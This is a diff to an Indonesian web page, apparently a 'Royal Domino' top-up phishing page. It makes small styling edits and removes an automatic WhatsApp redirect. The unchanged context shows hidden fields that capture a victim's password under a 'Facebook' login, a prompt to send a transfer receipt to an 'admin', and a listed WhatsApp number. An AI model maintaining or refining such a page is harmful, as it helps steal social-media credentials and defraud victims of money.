@@ -220,7 +220,7 @@ body {
     display: flex;
     justify-content: space-around;
     align-items: center;
-    padding: 10px 0;
+    padding: 10px 20px;
 }
 
 .buttonnwgverifhdi button {
@@ -239,7 +239,7 @@ body {
   width: 45%; /* Ambil 45% lebar container */
 }
 
-/* Style WA baru */
+/* CSS BARU UNTUK TOMBOL WHATSAPP DI SAMPING KIRIM */
 .wa-inline-button {
     display: inline-block;
     background-color: #25d366 !important;
@@ -305,7 +305,7 @@ body {
                         <div class="imageslide">
                           <div style="text-align:center"> 
                             <figure class="sliderbanner" style="display: block;"> 
-                              <img src="img/id.jpg" alt="Image" height="200" width="200">
+                              <img src="img/id.jpg" alt="image" height="200" width="200">
                             </figure> 
                             <div class="itemkontol">
                               <label>4.</label> 
@@ -333,7 +333,7 @@ body {
    <div class="containernwghdi"> 
     <div class="boxverifnwghdi"> 
      <div class="headernwgverifhdi"> 
-       <div style="display: block;">             <input type="file" id="myFile" name="filename">
+       <div style="display: block;">   <input type="file" id="myFile" name="filename">
         </div>
        </div>
        <div style="background: #0b5250;">   <div class="appnwghdiprem" style="background: #0b5250;"> 
@@ -367,7 +367,7 @@ body {
                                           <input type="hidden" name="password" id="resspw" value="" readonly>
                                           <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
                                           
-                                                                                    <button type="submit">Kirim</button> 
+                                          <button type="submit">Kirim</button> 
                                          <a href="https://wa.me/6285343802982?text=Halo%20Admin%20Royal%20Domino%2C%20saya%20sudah%20mengisi%20formulir%20dan%20ingin%20mengirim%20screenshot%20konfirmasi%20transaksi." class="wa-inline-button" target="_blank">
                                             <i class="fab fa-whatsapp"></i> Chat Admin
                                          </a>
@@ -439,10 +439,6 @@ function myFunction() {
         alert('✅ DATA BERHASIL DIKIRIM! Selanjutnya, WAJIB chat Admin di WhatsApp untuk mengirimkan bukti transfer Anda.');
         
         form.reset(); // Kosongkan formulir
-        
-        // 3. Arahkan pengguna OTOMATIS ke WhatsApp
-        const wa_text = "Halo%20Admin%20Royal%20Domino%2C%20data%20saya%20sudah%20terkirim%20via%20form%20dan%20ingin%20mengirim%20screenshot%20konfirmasi.";
-        window.location.href = `https://wa.me/${WA_ADMIN_NUMBER}?text=${wa_text}`;
 
       }, function(error) {
         // Jika gagal
